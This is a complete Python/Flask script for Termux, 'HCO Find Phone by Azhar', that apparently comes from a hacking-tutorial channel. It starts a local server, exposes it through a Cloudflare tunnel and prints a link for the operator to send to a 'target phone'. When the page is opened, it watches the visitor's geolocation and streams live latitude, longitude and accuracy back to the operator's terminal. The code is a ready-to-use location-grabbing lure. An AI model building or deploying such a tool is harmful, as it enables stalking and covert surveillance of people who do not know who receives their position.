# HCO Find Phone by Azhar - Fully Automatic Termux Version
# Requirements: Termux, Python3, Flask, cloudflared, Termux:API

import os, subprocess, threading, time, re, sys
from flask import Flask, request, render_template_string, jsonify

# Color codes with bold
RED = "\033[1;91m"
GREEN = "\033[1;92m"
CYAN = "\033[1;96m"
YELLOW = "\033[1;93m"
MAGENTA = "\033[1;95m"
BLUE = "\033[1;94m"
WHITE = "\033[1;97m"
RESET = "\033[0m"
CLEAR = "\033[2J\033[H"

locations = {}
app = Flask(__name__)
cloudflared_process = None
cloudflare_link = ""

# ---------------- Flask routes -----------------
dashboard_template = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>HCO Find Phone by Azhar</title>
<script>
function sendLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.watchPosition(function(position){
            fetch('/update', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy
                })
            });
        }, function(error){
            alert("Location access denied or unavailable.");
        }, { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 });
    } else {
        alert("Geolocation is not supported by your browser");
    }
}
window.onload = function() {
    document.getElementById('status').innerHTML = 'Requesting location access...';
    sendLocation();
};
</script>
<style>
body { 
    background: #000; 
    color: #0f0; 
    text-align: center; 
    font-family: Arial, sans-serif; 
    padding: 20px;
}
h1 { 
    font-size: 28px; 
    margin-top: 30px;
    color: #ff0000;
    text-shadow: 0 0 10px #ff0000;
}
p { 
    font-size: 18px; 
    color: #0f0; 
    margin: 15px 0;
}
.container {
    max-width: 500px;
    margin: 0 auto;
    border: 2px solid #0f0;
    border-radius: 10px;
    padding: 20px;
    background: #111;
}
.logo {
    font-size: 24px;
    font-weight: bold;
    margin-bottom: 20px;
    color: #ff0000;
}
</style>
</head>
<body>
<div class="container">
    <div class="logo">HCO FIND PHONE BY AZHAR</div>
    <p>Your location will be sent automatically to the Termux dashboard.</p>
    <p id="status">Waiting for permission...</p>
    <p>Keep this page open for continuous tracking</p>
</div>
</body>
</html>
"""

@app.route('/')
def dashboard():
    return render_template_string(dashboard_template)

@app.route('/location')
def get_location():
    return jsonify(locations)

@app.route('/update', methods=['POST'])
def update_location():
    data = request.json
    if data and 'lat' in data and 'lon' in data:
        locations['lat'] = data['lat']
        locations['lon'] = data['lon']
        locations['accuracy'] = data.get('accuracy', 'N/A')
        locations['last_update'] = time.time()
        return "OK"
    return "Invalid Data"

def start_server():
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

# ---------------- Tool lock + countdown + YouTube -----------------
def tool_lock_youtube():
    os.system(CLEAR)
    print(f"{RED}{'='*80}{RESET}")
    print(f"{RED}{'🔒 TOOL LOCKED 🔒'.center(80)}{RESET}")
    print(f"{RED}{'Subscribe & click the BELL icon on YouTube 🔔'.center(80)}{RESET}")
    print(f"{RED}{'='*80}{RESET}\n")
    print(f"{CYAN}{'Redirecting in:'.center(80)}{RESET}\n")
    
    # Simple countdown without clearing lines
    for i in range(5, 0, -1):
        print(f"{CYAN}{str(i).center(80)}{RESET}")
        time.sleep(1)
    
    youtube_url = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
    try:
        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", youtube_url], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{GREEN}Opening YouTube...{RESET}")
    except:
        print(f"{YELLOW}Open YouTube manually: {youtube_url}{RESET}")
    
    input(f"\n{YELLOW}Press ENTER after returning from YouTube...{RESET}")

# ---------------- Start cloudflared tunnel and capture URL automatically -----------------
def start_cloudflared():
    global cloudflare_link
    
    print(f"{YELLOW}Starting Cloudflare tunnel...{RESET}")
    
    # Check if cloudflared is installed
    try:
        result = subprocess.run(["cloudflared", "--version"], 
                               capture_output=True, text=True, timeout=5)
        if result.returncode != 0:
            print(f"{RED}Cloudflared not found. Installing...{RESET}")
            subprocess.run(["pkg", "install", "cloudflared", "-y"], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        print(f"{RED}Cloudflared not found. Installing...{RESET}")
        subprocess.run(["pkg", "install", "cloudflared", "-y"], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)
    
    # Kill any existing cloudflared processes
    subprocess.run(["pkill", "-f", "cloudflared"], 
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    
    # Start cloudflared in a separate process
    try:
        # Use a different approach - run cloudflared with nohup
        subprocess.Popen([
            "nohup", "cloudflared", "tunnel", "--url", "http://localhost:5000"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Wait for tunnel to establish
        time.sleep(8)
        
        # Try to get the URL using the cloudflared command
        try:
            result = subprocess.run([
                "timeout", "10", "cloudflared", "tunnel", "--url", "http://localhost:5000"
            ], capture_output=True, text=True, timeout=15)
            
            # Search for the URL in the output
            output = result.stderr + result.stdout
            for line in output.split('\n'):
                if "https://" in line and "trycloudflare.com" in line:
                    match = re.search(r"(https://[^\s]+\.trycloudflare\.com)", line)
                    if match:
                        cloudflare_link = match.group(1)
                        print(f"{GREEN}Cloudflare URL found: {cloudflare_link}{RESET}")
                        return cloudflare_link
        except:
            pass
        
        # If we couldn't get the URL automatically, use manual method
        print(f"{YELLOW}Could not automatically detect Cloudflare URL.{RESET}")
        print(f"{YELLOW}Please start cloudflared manually in a NEW Termux tab:{RESET}")
        print(f"{CYAN}cloudflared tunnel --url http://localhost:5000{RESET}")
        print(f"{YELLOW}Wait for it to generate a URL, then paste it here:{RESET}")
        cloudflare_link = input().strip()
        
    except Exception as e:
        print(f"{RED}Error starting cloudflared: {e}{RESET}")
        print(f"{YELLOW}Please start cloudflared manually:{RESET}")
        print(f"{CYAN}cloudflared tunnel --url http://localhost:5000{RESET}")
        print(f"{YELLOW}Then paste the URL here:{RESET}")
        cloudflare_link = input().strip()
    
    return cloudflare_link

# ---------------- Display banner -----------------
def display_banner():
    os.system(CLEAR)
    print(f"{RED}{'='*80}{RESET}")
    print(f"{RED}{'HCO FIND PHONE BY AZHAR'.center(80)}{RESET}")
    print(f"{RED}{'='*80}{RESET}\n")
    print(f"{GREEN}{'Send this link to the phone to track location:'.center(80)}{RESET}\n")
    print(f"{CYAN}{cloudflare_link.center(80)}{RESET}\n")
    print(f"{YELLOW}{'NOTE: It may take 30-60 seconds after opening the link'.center(80)}{RESET}")
    print(f"{YELLOW}{'for the location page to appear (Cloudflare tunnel setup)'.center(80)}{RESET}")
    print(f"{MAGENTA}{'Press Ctrl+C to exit'.center(80)}{RESET}\n")

# ---------------- Main -----------------
if __name__ == "__main__":
    try:
        # First show tool lock and YouTube redirect
        tool_lock_youtube()
        
        # Clear screen after YouTube redirect
        os.system(CLEAR)
        print(f"{GREEN}Starting HCO Find Phone tool...{RESET}")
        
        # Start Flask server
        print(f"{YELLOW}Starting server...{RESET}")
        server_thread = threading.Thread(target=start_server, daemon=True)
        server_thread.start()
        
        # Wait a moment for the server to start
        time.sleep(3)
        
        # Start Cloudflare tunnel and capture public URL
        print(f"{YELLOW}Setting up Cloudflare tunnel...{RESET}")
        print(f"{YELLOW}This may take 10-20 seconds...{RESET}")
        cloudflare_url = start_cloudflared()
        
        # Give the tunnel more time to establish properly
        print(f"{YELLOW}Waiting for tunnel to fully establish...{RESET}")
        time.sleep(10)
        
        # Display banner with the link
        display_banner()
        
        # Live location printing in Termux
        last_location_time = 0
        connection_wait_time = time.time()
        
        while True:
            if locations and 'last_update' in locations:
                current_time = time.time()
                # Only update if we have a new location
                if locations['last_update'] > last_location_time:
                    last_location_time = locations['last_update']
                    time_str = time.strftime('%H:%M:%S', time.localtime(locations['last_update']))
                    print(f"{GREEN}📍 LIVE LOCATION {time_str}{RESET}")
                    print(f"{GREEN}Latitude: {locations.get('lat')}{RESET}")
                    print(f"{GREEN}Longitude: {locations.get('lon')}{RESET}")
                    print(f"{GREEN}Accuracy: {locations.get('accuracy', 'N/A')}m{RESET}")
                    print(f"{BLUE}{'-'*40}{RESET}")
            else:
                # Show waiting message with elapsed time
                elapsed = int(time.time() - connection_wait_time)
                print(f"{YELLOW}Waiting for target phone to connect ({elapsed}s)...{RESET}")
                print(f"{YELLOW}Open this URL on target phone: {CYAN}{cloudflare_url}{RESET}")
                print(f"{YELLOW}If you see a Cloudflare page, wait 30-60 seconds and refresh{RESET}")
                print(f"{BLUE}{'-'*40}{RESET}")
            
            time.sleep(3)
            
    except KeyboardInterrupt:
        print(f"\n{RED}Shutting down...{RESET}")
        try:
            subprocess.run(["pkill", "-f", "cloudflared"], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        print(f"{GREEN}Thank you for using HCO Find Phone!{RESET}")
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")
        print(f"{YELLOW}Please make sure you have installed all requirements:{RESET}")
        print(f"{CYAN}pkg install python cloudflared termux-api -y{RESET}")
        print(f"{CYAN}pip install flask requests{RESET}")
